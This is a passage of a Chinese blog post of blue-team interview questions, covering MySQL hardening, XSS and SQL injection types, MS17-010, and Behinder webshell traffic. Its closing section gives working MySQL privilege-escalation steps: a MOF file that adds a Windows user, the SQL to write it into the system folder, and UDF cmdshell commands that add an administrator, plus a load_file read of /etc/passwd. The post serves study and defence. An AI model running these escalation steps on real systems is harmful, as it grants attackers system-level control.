<h4 id="移除测试自带的test数据库和禁用LOCAL-INFILE-OUTFILE"><a href="#移除测试自带的test数据库和禁用LOCAL-INFILE-OUTFILE" class="headerlink" title="移除测试自带的test数据库和禁用LOCAL INFILE OUTFILE"></a>移除测试自带的test数据库和禁用LOCAL INFILE OUTFILE</h4><p>删除可以匿名访问的test数据库和防止非授权用户访问本地文件</p>
<p><strong>移除自带的测试（test）数据库</strong></p>
<p>在默认安装的MySQL中，匿名用户可以访问test数据库。我们可以移除任何无用的数据库，以避免在不可预料的情况下访问了数据库。因而，在MySQL控制台中，执行：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224652237.png"></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; DROP DATABASE test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224712288.png"></p>
<p><strong>禁用LOCAL INFILE，防止造成任意文件读取</strong></p>
<p>另一项改变是禁用”LOAD DATA LOCAL INFILE”命令，这有助于防止非授权用户访问本地文件。在PHP应用程序中发现有新的SQL注入漏洞时，这样做尤其重要。此外，在某些情况下，LOCAL INFILE命令可被用于访问操作系统上的其它文件(如&#x2F;etc&#x2F;passwd)，应使用下现的命令：</p>
<pre class="line-numbers language-none"><code class="language-none">mysql&gt; SELECT load_file(&quot;&#x2F;etc&#x2F;passwd&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224734879.png"></p>
<p>禁用LOCAL INFILE命令，应当在MySQL配置文件的[mysqld]部分增加下面的参数：</p>
<pre class="line-numbers language-none"><code class="language-none">set-variable&#x3D;local-infile&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224755283.png"></p>
<p><strong>禁用LOCAL OUTFILE，防止webshell写出</strong></p>
<p>查看是否可以导入导出</p>
<pre class="line-numbers language-none"><code class="language-none">show variables like &#39;%secure%&#39;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p>
<p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</p>
<p>禁用LOCAL OUTFILE命令(对导入同样生效)，应当在MySQL配置文件的[mysqld]部分增加下面的参数：</p>
<pre class="line-numbers language-none"><code class="language-none">secure_file_priv&#x3D; null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>删除历史文件</strong><br>MySQL服务器有一个历史文件，它可以帮助你在安装出错的时候找到问题所在。历史文件包含敏感信息，比如说密码，如果这些信息被攻击者获得，那么将会给<br>你的数据库带来巨大的安全隐患。在安装成功后，历史文件并没有什么用，因此你可以使用cat &#x2F;dev&#x2F;null &gt;<br>~&#x2F;.mysql_history指令来删除文件当中的内容</p>
<h3 id="网站加固"><a href="#网站加固" class="headerlink" title="网站加固"></a>网站加固</h3><p>部署CDN，定期扫描漏洞，上waf，隐藏后台登陆口，关闭不变要的端口。</p>
<h2 id="23-XSS类型都有哪些，什么是dom型xss，如何防御"><a href="#23-XSS类型都有哪些，什么是dom型xss，如何防御" class="headerlink" title="23.XSS类型都有哪些，什么是dom型xss，如何防御"></a>23.XSS类型都有哪些，什么是dom型xss，如何防御</h2><p><strong>XSS（Cross-Site Scripting）又称跨站脚本</strong>，XSS的重点不在于跨站点，而是在于脚本的执行。XSS是一种经常出现在 Web 应用程序中的计算机安全漏洞，是由于 Web 应用程序对用户的输入过滤不足而产生的<br>常见的有三种：<strong>反射型</strong>、<strong>DOM-based 型</strong>、存储型。<br>其中存储型归类为持久型 XSS 攻击，反射型、DOM-based 型可以归类为非持久型 XSS 攻击。<br>反射型：经过后端，不经过数据库<br>存储型：经过后端，经过数据库<br>DOM：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的</p>
<p>DOM:客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等</p>
<h2 id="24-sql注入你都了解什么类型，如何防御"><a href="#24-sql注入你都了解什么类型，如何防御" class="headerlink" title="24.sql注入你都了解什么类型，如何防御"></a>24.sql注入你都了解什么类型，如何防御</h2><p>最基础的注入-union注入攻击<br>Boolean注入攻击-布尔盲注<br>报错注入攻击<br>时间注入攻击-时间盲注<br>堆叠查询注入攻击<br>二次注入攻击<br>宽字节注入攻击<br>base64注入攻击<br>cookie注入攻击-http请求头参数注入<br>XFF注入攻击-http请求头参数注入<br>知道绝对路径的注入<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11614129.html">https://www.cnblogs.com/-chenxs/p/11614129.html</a><br>sql语句预编译和绑定变量，但是不是所有场景都能够采用 sql语句预编译，有一些场景必须的采用 字符串拼接的方式，此时，我们严格检查参数的数据类型，还有可以使用一些安全函数，来方式sql注入<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35114086/article/details/92830127">https://blog.csdn.net/qq_35114086/article/details/92830127</a></p>
<h2 id="25-MS17-010使用的是什么端口"><a href="#25-MS17-010使用的是什么端口" class="headerlink" title="25.MS17-010使用的是什么端口"></a>25.MS17-010使用的是什么端口</h2><p>永恒之蓝漏洞，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器<br>，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。<br>更多：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/193681.html">https://www.freebuf.com/column/193681.html</a></p>
<h2 id="26-冰蝎连接的特征和原理"><a href="#26-冰蝎连接的特征和原理" class="headerlink" title="26.冰蝎连接的特征和原理"></a>26.冰蝎连接的特征和原理</h2><p>冰蝎的通信过程可以分为两个阶段：1、密钥协商2、加密传输<br>第一阶段-密钥协商<br>1）攻击者通过 GET 或者 POST 方法，形如 <a target="_blank" rel="noopener" href="http://127.0.0.1/shell.aspx?pass=645">http://127.0.0.1/shell.aspx?pass=645</a> 的请求服务器密钥；<br>2）服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。<br>第二阶段-加密传输<br>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；2）服务端接受密<br>文后进行 AES 或 XOR 运算解密，执行相应的命令；3）执行结果通过AES加密后返回给攻击者。</p>
<p>冰蝎特征检测<br>总结冰蝎在流量交互中的特征，这些特征可分为两类。一类是可绕过特征，这类特征攻击者可通过构造报文进行绕<br>过，致使设备检测不到冰蝎 webshell 特征。另一类是非可绕过特征，攻击者在某些情景无法更改 HTTP 某些字<br>段，致使有固定报文字段可供设备检测。使用单个特征误报较高，但多个特征配合使用可降低误报，推荐多个特征<br>搭配使用，进一步提升特征检测的准确性。<br>详细：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/135227454">https://zhuanlan.zhihu.com/p/135227454</a></p>
<h2 id="27-菜刀的原理与特征"><a href="#27-菜刀的原理与特征" class="headerlink" title="27.菜刀的原理与特征"></a>27.菜刀的原理与特征</h2><h2 id="28-sql会手工注入嘛，order-by和limit后面改怎么写"><a href="#28-sql会手工注入嘛，order-by和limit后面改怎么写" class="headerlink" title="28.sql会手工注入嘛，order by和limit后面改怎么写"></a>28.sql会手工注入嘛，order by和limit后面改怎么写</h2><p>order by是mysql中对查询数据进行排序的方法，后面可以跟列名或一个数字，比如id是user表第一列的列名，那<br>么填id或1的效果是一样的<br>LIMIT[位置偏移量,]行数<br>其中，中括号里面的参数是可选参数，位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即<br>第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。<br>limit后面还可以拼接into和produce函数，其中into可以用来写文件，用procedure analyse()这个子查询<br>而且只能用extractvalue 和 benchmark 函数进行延时</p>
<h2 id="mysql提权方式"><a href="#mysql提权方式" class="headerlink" title="mysql提权方式"></a>mysql提权方式</h2><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>1.原理<br>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p>
<p>2.利用条件</p>
<p>mysql用户具有root权限(对上面那个目录可写）<br>关闭了secure-file-priv<br>3.利用方式<br>下面是一段写好了的mof利用代码</p>
<pre class="line-numbers language-none"><code class="language-none">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 

instance of __EventFilter as $EventFilter

&#123; 

EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; 

Name  &#x3D; &quot;filtP2&quot;; 

    Query &#x3D; &quot;Select \ From __InstanceModificationEvent &quot; 

            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 

            &quot;And TargetInstance.Second &#x3D; 5&quot;; 

QueryLanguage &#x3D; &quot;WQL&quot;; 

&#125;; 



instance of ActiveScriptEventConsumer as $Consumer 

&#123; 

    Name &#x3D; &quot;consPCSV2&quot;; 

ScriptingEngine &#x3D; &quot;JScript&quot;; 

ScriptText &#x3D; 

    &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add&quot;)&quot;; 

&#125;; 

instance of __FilterToConsumerBinding

&#123; 

    Consumer   &#x3D; $Consumer; 

    Filter &#x3D; $EventFilter; 

&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p>
<pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;你上传的路径&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>1.原理<br>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p>
<p>2.利用条件</p>
<p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。<br>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。<br>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备&#96;root账号所具备的权限的其它账号也可以。<br>可以将udf.dll写入到相应目录的权限。</p>
<p>注：关于plugin目录，可在mysql中执行</p>
<pre class="line-numbers language-none"><code class="language-none">show variables like &#39;%plugin%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>进行查看，这个目录也就是dll文件需要导入的目录</p>
<p>3.利用方式</p>
<p>将dll文件导入到相应目录，如果导入错误会产生can&#96;t open shared library错误<br>创建自定义函数</p>
<pre class="line-numbers language-none"><code class="language-none">create function cmdshell returns string soname &#39;udf.dll&#39;;
select cmdshell(&#39;net user miao zjicmisa.org &#x2F;add&#39;);
select cmdshell(&#39;net localgroup administrators miao &#x2F;add&#39;);
drop function cmdshell; 删除函数
delete from mysql.func where name&#x3D;&#39;cmdshell&#39;  删除函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">R1ch029</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://R1ch029.cf/2022/04/02/2022-04-02-hu-wang-mian-shi-ti-mu/">http://R1ch029.cf/2022/04/02/2022-04-02-hu-wang-mian-shi-ti-mu/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">R1ch029</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E6%8A%A4%E7%BD%91/">
                                    <span class="chip bg-color">护网</span>
                                </a>
                            
                                <a href="/tags/%E8%93%9D%E9%98%9F/">
                                    <span class="chip bg-color">蓝队</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/04/12/2022-04-12-poc-bomber-yong-yu-shen-tou-he-hong-dui-kuai-su-da-dian-de-lou-dong-jian-ce-gong-ju/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="POC bomber-用于渗透和红队快速打点的漏洞检测工具">
                        
                        <span class="card-title">POC bomber-用于渗透和红队快速打点的漏洞检测工具</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            我爱做脚本小子
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-12
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/POC-bomber/" class="post-category">
                                    POC bomber
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/POC-bomber/">
                        <span class="chip bg-color">POC bomber</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/03/31/2022-03-31-spring-core-rec-2022-03-29-lou-dong-fu-xian/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="spring-core-rec-2022-03-29漏洞复现">
                        
                        <span class="card-title">spring-core-rec-2022-03-29漏洞复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            脚本小子速成
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
                                    漏洞复现
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                        <span class="chip bg-color">漏洞复现</span>
                    </a>
                    
                    <a href="/tags/spring-core-rec-2022-03-29/">
                        <span class="chip bg-color">spring-core-rec-2022-03-29</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2022</span>
            
            <a href="/about" target="_blank">R1ch029</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">38.7k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "12";
                        var startDate = "20";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1915342797@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1915342979" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1915342979" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
